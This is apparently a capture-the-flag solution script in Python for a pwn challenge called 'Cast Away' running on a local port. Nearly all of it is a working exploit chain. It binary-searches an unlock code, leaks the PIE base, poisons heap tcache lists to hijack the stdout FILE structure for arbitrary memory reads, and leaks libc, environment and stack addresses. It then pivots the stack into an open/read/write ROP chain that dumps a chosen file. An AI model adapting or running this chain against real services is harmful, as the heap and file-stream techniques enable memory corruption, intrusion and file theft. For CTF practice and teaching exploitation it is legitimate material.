#!/usr/bin/env python3
"""Cast Away: stdout leak, stack pivot, then list the filesystem."""
import re
import socket
import struct
import sys

HOST, PORT = "127.0.0.1", 19701
PROMPT = b"castaway> "
MARKER = b"wrote note 11+32 (4 words)\n"


def fnv1a(data, h=0xCBF29CE484222325):
    for b in data:
        h ^= b
        h = (h * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    return h


def fnv8(v):
    return fnv1a((v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little"))


def u64(b, o):
    return struct.unpack_from("<Q", b, o)[0]


class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=20)
        self.buf = b""

    def recv_until(self, token):
        while token not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                break
            self.buf += chunk
        i = self.buf.find(token)
        if i < 0:
            raise SystemExit("eof waiting for " + repr(token[:40]))
        out, self.buf = self.buf[: i + len(token)], self.buf[i + len(token) :]
        return out

    def cmd(self, line: str) -> bytes:
        self.s.sendall(line.encode() + b"\n")
        return self.recv_until(PROMPT)


def main():
    c = Conn()
    c.recv_until(PROMPT)

    def Cs(cmd):
        return c.cmd(cmd).decode(errors="replace").replace("castaway> ", "").strip()

    def prev(raw):
        m = re.search(rb"previous=([0-9a-f]{16})", raw)
        if not m:
            raise SystemExit(raw[:180])
        return int(m.group(1), 16)

    def val(raw):
        m = re.search(rb"= ([0-9a-f]{16})", raw)
        if not m:
            raise SystemExit(raw[:220])
        return int(m.group(1), 16)

    def read_slot(i):
        p = prev(c.cmd("EDIT %d 0000000000000000" % i))
        c.cmd("EDIT %d %016x" % (i, p))
        return p

    lo, hi = 0, (1 << 64) - 1
    for _ in range(80):
        mid = (lo + hi) // 2
        r = Cs("UNLOCK %016x" % mid)
        if "equal -- unlocked" in r:
            break
        if "higher" in r:
            lo = mid + 1
        elif "lower" in r:
            hi = mid - 1
        else:
            raise SystemExit(r)
    else:
        raise SystemExit("unlock failed")
    print("[*] unlocked", flush=True)

    Cs("SURVEY")
    Cs("SWITCH")
    r = Cs("PREPARE_EXPORT readme.txt")
    size = int(re.search(r"size=(\d+)", r).group(1))
    ctr = read_slot(7)
    H = read_slot(6)
    base = (read_slot(5) ^ ctr) - 0x8080
    if base % 0x1000:
        raise SystemExit("bad pie base")
    print("[*] pie", hex(base), flush=True)
    README = b"/srv/survey/exports/readme.txt"
    K = H ^ fnv1a(README) ^ fnv8(size) ^ fnv8(ctr)

    def setname(ptr, name, sz):
        c.cmd("EDIT 0 %016x" % ptr)
        c.cmd("EDIT 1 %016x" % len(name))
        c.cmd("EDIT 4 %016x" % sz)
        c.cmd("EDIT 6 %016x" % (fnv1a(name) ^ fnv8(sz) ^ fnv8(ctr) ^ K))

    setname(base + 0x318, b"/lib64/ld-linux-x86-64.so.2", size)
    if b"redacted" not in c.cmd("RUN"):
        raise SystemExit("ledger locked")

    def heap_pair(ida, idb, stride):
        v = val(c.cmd("NOTE_READ %d 0" % idb))
        pa = val(c.cmd("NOTE_READ %d 0" % ida))
        hits = []
        for k in (pa - 1, pa, pa + 1, pa + 2):
            cand = v ^ k
            if (cand >> 12) == pa and (cand & 0xF) == 0:
                hits.append((cand, k))
        if not hits:
            raise SystemExit("heap decode failed")
        for cand, k in hits:
            if ((cand + stride) >> 12) == k:
                return cand, k
        return hits[0]

    c.cmd("NOTE_NEW 128")
    c.cmd("NOTE_NEW 128")
    c.cmd("NOTE_FREE 0")
    c.cmd("NOTE_FREE 1")
    heap, _ = heap_pair(0, 1, 0x90)
    c.cmd("NOTE_NEW 128")
    c.cmd("NOTE_NEW 128")  # id 3 == heap
    print("[*] heap note", hex(heap), flush=True)

    c.cmd("NOTE_NEW 128")
    c.cmd("NOTE_NEW 128")
    c.cmd("NOTE_FREE 4")
    c.cmd("NOTE_FREE 5")
    _, page5 = heap_pair(4, 5, 0x90)
    c.cmd("NOTE_WRITE 5 0 %016x" % (page5 ^ (base + 0x8040)))
    c.cmd("NOTE_NEW 128")
    c.cmd("NOTE_NEW 128")  # id 7
    stdout = val(c.cmd("NOTE_READ 7 0"))
    print("[*] stdout", hex(stdout), flush=True)

    c.cmd("NOTE_NEW 256")
    c.cmd("NOTE_NEW 256")
    c.cmd("NOTE_FREE 8")
    c.cmd("NOTE_FREE 9")
    _, page9 = heap_pair(8, 9, 0x110)
    c.cmd("NOTE_WRITE 9 0 %016x" % (page9 ^ stdout))
    c.cmd("NOTE_NEW 256")
    c.cmd("NOTE_NEW 256")  # id 11 is the FILE
    q = [val(c.cmd("NOTE_READ 11 %d" % off)) for off in range(0, 0x48, 8)]
    file_buf = q[7]
    print("[*] file buf", hex(file_buf), flush=True)

    c.cmd("NOTE_WRITE3 11 0 %016x %016x %016x %016x" % (0xFBAD1800, 0, 0, 0))

    def leak(addr, n):
        c.s.sendall(
            ("NOTE_WRITE3 11 32 %016x %016x %016x %016x\n" % (addr, addr + n, addr + n, file_buf)).encode()
        )
        blob = b""
        while MARKER not in blob:
            chunk = c.s.recv(4096)
            if not chunk:
                raise SystemExit("leak eof at %x" % addr)
            blob += chunk
        data, _, rest = blob.partition(MARKER)
        c.buf = rest
        c.recv_until(PROMPT)
        if len(data) != n:
            raise SystemExit("leak %x wanted %d got %d" % (addr, n, len(data)))
        return data

    def read(addr, n):
        out = b""
        while len(out) < n:
            chunk = min(0x400, n - len(out))
            out += leak(addr + len(out), chunk)
        return out

    libc = stdout - 0x1D4760
    if leak(libc, 4) != b"\x7fELF":
        raise SystemExit("libc base mismatch")
    print("[*] libc", hex(libc), flush=True)
    pop_rdi = libc + 0x277E5
    pop_rsi = libc + 0x28F99
    pop_rax = libc + 0x3F197
    pop_rsp = libc + 0x2746A
    pop_rdx = libc + 0x85325
    syscall = libc + 0x86172
    for addr, pat in (
        (pop_rdi, b"\x5f\xc3"),
        (pop_rsi, b"\x5e\xc3"),
        (pop_rax, b"\x58\xc3"),
        (pop_rsp, b"\x5c\xc3"),
        (pop_rdx, b"\x5a\x5b\xc3"),
        (syscall, b"\x0f\x05\xc3"),
    ):
        if leak(addr, len(pat)) != pat:
            raise SystemExit("gadget moved at %x" % addr)

    def rdx(value):
        return [pop_rdx, value, 0]

    environ_ptr = u64(read(libc + 0x1DB320, 8), 0)
    print("[*] environ", hex(environ_ptr), flush=True)
    envp = read(environ_ptr, 0x60)
    for i in range(0, len(envp), 8):
        p = u64(envp, i)
        if p == 0:
            break
        if not (environ_ptr - 0x100000 < p < environ_ptr + 0x100000):
            print("[*] ENV ptr skipped", hex(p), flush=True)
            continue
        s = leak(p, 0x30).split(b"\x00", 1)[0]
        print("[*] ENV", s.decode("latin1"), flush=True)
    argv_area = read(environ_ptr - 0x40, 0x40)
    print("[*] below environ", argv_area.hex(), flush=True)

    site = base + 0x415E
    stack = read(environ_ptr - 0x3000, 0x3000)
    hits = []
    for i in range(0, len(stack) - 7, 8):
        if u64(stack, i) == site:
            hits.append(environ_ptr - 0x3000 + i)
    print("[*] return slots", [hex(h) for h in hits], flush=True)
    if not hits:
        raise SystemExit("return address not on the leaked stack")
    slot = hits[0]
    if slot & 0xF != 8:
        raise SystemExit("unexpected alignment %x" % slot)
    target = slot + 8

    # id 12/13 are a 0x400 chain note; id 15 is the live copy of id 12.
    c.cmd("NOTE_NEW 1024")
    c.cmd("NOTE_NEW 1024")
    c.cmd("NOTE_FREE 12")
    c.cmd("NOTE_FREE 13")
    chain_at, _ = heap_pair(12, 13, 0x410)
    c.cmd("NOTE_NEW 1024")
    c.cmd("NOTE_NEW 1024")
    print("[*] chain note", hex(chain_at), flush=True)

    c.cmd("NOTE_NEW 768")
    c.cmd("NOTE_NEW 768")
    c.cmd("NOTE_FREE 16")
    c.cmd("NOTE_FREE 17")
    _, page = heap_pair(16, 17, 0x310)
    c.cmd("NOTE_WRITE 17 0 %016x" % (page ^ target))
    c.cmd("NOTE_NEW 768")
    got = Cs("NOTE_NEW 768")
    print("[*]", got, flush=True)
    if "19" not in got:
        raise SystemExit("stack note id unexpected: " + got)

    for off in (0, 16, 32):
        c.cmd(
            "NOTE_WRITE3 11 %d %016x %016x %016x %016x"
            % (off, q[off // 8], q[off // 8 + 1], q[off // 8 + 2], q[off // 8 + 3])
        )

    FPATH = b"@@PATH@@\x00"
    raw = bytearray(0x80)
    raw[0:len(FPATH)] = FPATH
    for off in range(0, 0x80, 8):
        c.cmd("NOTE_WRITE 15 %d %016x" % (off, int.from_bytes(raw[off : off + 8], "little")))

    size = @@SIZE@@
    scratch = slot - (size + 0x200)

    def readfile(path_addr, dest, n):
        part = [pop_rax, 2, pop_rdi, path_addr, pop_rsi, 0]  # open(path, O_RDONLY)
        part += rdx(0)
        part += [syscall]
        part += [pop_rax, 0, pop_rdi, 5, pop_rsi, dest]  # read(fd=5, dest, n)
        part += rdx(n)
        part += [syscall]
        part += [pop_rax, 1, pop_rdi, 1, pop_rsi, dest]  # write(1, dest, n)
        part += rdx(n)
        part += [syscall]
        return part

    words = []
    words += readfile(chain_at + 0x00, scratch, size)
    print("[*] %d rop words" % len(words), flush=True)
    if 0x80 + len(words) * 8 > 0x3F8:
        raise SystemExit("chain does not fit")
    for i, w in enumerate(words):
        c.cmd("NOTE_WRITE 15 %d %016x" % (0x80 + i * 8, w))

    c.s.sendall(
        ("NOTE_WRITE3 19 -8 %016x %016x %016x %016x\n" % (pop_rsp, chain_at + 0x80, 0, 0)).encode()
    )
    c.s.settimeout(20)
    out = b""
    try:
        while True:
            chunk = c.s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    open("/home/sira/Documents/CTF/Lancang_Mekong_CTF_comp/solved/pwn_cast_away/readfile_out.bin", "wb").write(out)

    nl = out.find(b"\n")
    body = out[nl + 1:] if nl >= 0 else out
    print("\n===== FILE CONTENT (%d bytes captured) =====" % len(body), flush=True)
    print(body[:size], flush=True)
    print("===== END =====", flush=True)

if __name__ == "__main__":
    main()
